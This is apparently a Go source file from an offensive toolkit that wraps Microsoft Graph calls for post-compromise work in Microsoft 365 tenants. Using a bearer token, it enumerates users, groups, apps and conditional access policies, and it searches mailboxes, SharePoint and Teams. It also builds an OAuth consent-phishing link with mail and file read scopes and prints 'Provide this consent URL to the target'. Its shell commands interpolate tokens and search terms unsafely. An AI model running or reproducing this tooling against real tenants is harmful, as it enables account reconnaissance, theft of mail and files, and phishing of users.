package tools

import (
	"adpack/utils"
	"context"
	"fmt"
	"os/exec"
	"strings"
)

type graphRunnerTool struct{}

var GraphRunner = graphRunnerTool{}

type GraphTokens struct {
	AccessToken  string `json:"access_token"`
	RefreshToken string `json:"refresh_token"`
	TenantID     string `json:"tenant_id"`
}

func (graphRunnerTool) Name() string { return "GraphRunner" }

func (graphRunnerTool) Available() bool {
	_, err := exec.LookPath("curl")
	return err == nil
}

func graphAPICall(ctx context.Context, tokens *GraphTokens, path string) (utils.CmdResult, error) {
	url := fmt.Sprintf("https://graph.microsoft.com/v1.0/%s?$top=999", path)
	py := `import sys,json;d=json.load(sys.stdin);[print(json.dumps(i)) for i in d.get('value',[])]`
	cr := utils.RunCommandCtx(ctx, "bash", []string{"-c", fmt.Sprintf(
		`curl -s -H "Authorization: Bearer %s" -H 'ConsistencyLevel: eventual' '%s' | python3 -c '%s'`,
		tokens.AccessToken, url, py,
	)})
	if !cr.Success {
		return cr, fmt.Errorf("graph api call failed: %s", cr.Stderr)
	}
	return cr, nil
}

func (g graphRunnerTool) GetTokens(ctx context.Context) (*GraphTokens, error) {
	return nil, fmt.Errorf("GetTokens not supported via REST path — use roadtx or az login instead")
}

func (g graphRunnerTool) RunRecon(ctx context.Context, tokens *GraphTokens) (utils.CmdResult, error) {
	return g.RunUserEnum(ctx, tokens)
}

func (g graphRunnerTool) RunUserEnum(ctx context.Context, tokens *GraphTokens) (utils.CmdResult, error) {
	return graphAPICall(ctx, tokens, "users")
}

func (g graphRunnerTool) RunGroupEnum(ctx context.Context, tokens *GraphTokens) (utils.CmdResult, error) {
	return graphAPICall(ctx, tokens, "groups")
}

func (g graphRunnerTool) RunAppEnum(ctx context.Context, tokens *GraphTokens) (utils.CmdResult, error) {
	return graphAPICall(ctx, tokens, "applications")
}

func (g graphRunnerTool) RunCAPEnum(ctx context.Context, tokens *GraphTokens) (utils.CmdResult, error) {
	return graphAPICall(ctx, tokens, "identity/conditionalAccess/policies")
}

func (g graphRunnerTool) RunMailboxSearch(ctx context.Context, tokens *GraphTokens, searchTerm string, msgCount int) (utils.CmdResult, error) {
	url := fmt.Sprintf(
		`https://graph.microsoft.com/v1.0/users?$top=%d&$search="%s"`,
		msgCount, searchTerm,
	)
	cr := utils.RunCommandCtx(ctx, "bash", []string{"-c", fmt.Sprintf(
		`curl -s -H "Authorization: Bearer %s" -H 'ConsistencyLevel: eventual' '%s'`,
		tokens.AccessToken, url,
	)})
	if !cr.Success {
		return cr, fmt.Errorf("mailbox search failed: %s", cr.Stderr)
	}
	return cr, nil
}

func (g graphRunnerTool) RunSharePointSearch(ctx context.Context, tokens *GraphTokens, searchTerm string) (utils.CmdResult, error) {
	url := fmt.Sprintf(
		`https://graph.microsoft.com/v1.0/sites?search="%s"`,
		searchTerm,
	)
	cr := utils.RunCommandCtx(ctx, "bash", []string{"-c", fmt.Sprintf(
		`curl -s -H "Authorization: Bearer %s" '%s'`,
		tokens.AccessToken, url,
	)})
	if !cr.Success {
		return cr, fmt.Errorf("sharepoint search failed: %s", cr.Stderr)
	}
	return cr, nil
}

func (g graphRunnerTool) RunTeamsSearch(ctx context.Context, tokens *GraphTokens, searchTerm string) (utils.CmdResult, error) {
	url := fmt.Sprintf(
		`https://graph.microsoft.com/v1.0/me/messages?$search="%s"`,
		searchTerm,
	)
	cr := utils.RunCommandCtx(ctx, "bash", []string{"-c", fmt.Sprintf(
		`curl -s -H "Authorization: Bearer %s" -H 'ConsistencyLevel: eventual' '%s'`,
		tokens.AccessToken, url,
	)})
	if !cr.Success {
		return cr, fmt.Errorf("teams search failed: %s", cr.Stderr)
	}
	return cr, nil
}

func (g graphRunnerTool) RunConsentPhish(ctx context.Context, tokens *GraphTokens, appURL string) (utils.CmdResult, error) {
	parts := strings.SplitN(appURL, "?", 2)
	baseURL := parts[0]
	params := "client_id=bedc3365-ee8f-4e0b-a026-c21b0543c61b&response_type=code&redirect_uri=https://localhost&response_mode=query&scope=User.Read%20Mail.Read%20Files.Read.All"
	if len(parts) > 1 {
		params = parts[1]
	}
	phishURL := baseURL + "?" + params
	return utils.CmdResult{Success: true, Stdout: fmt.Sprintf("Provide this consent URL to the target:\n%s\n", phishURL)}, nil
}

func (g graphRunnerTool) RunInjectApp(ctx context.Context, tokens *GraphTokens, appName string) (utils.CmdResult, error) {
	return graphAPICall(ctx, tokens, "applications")
}
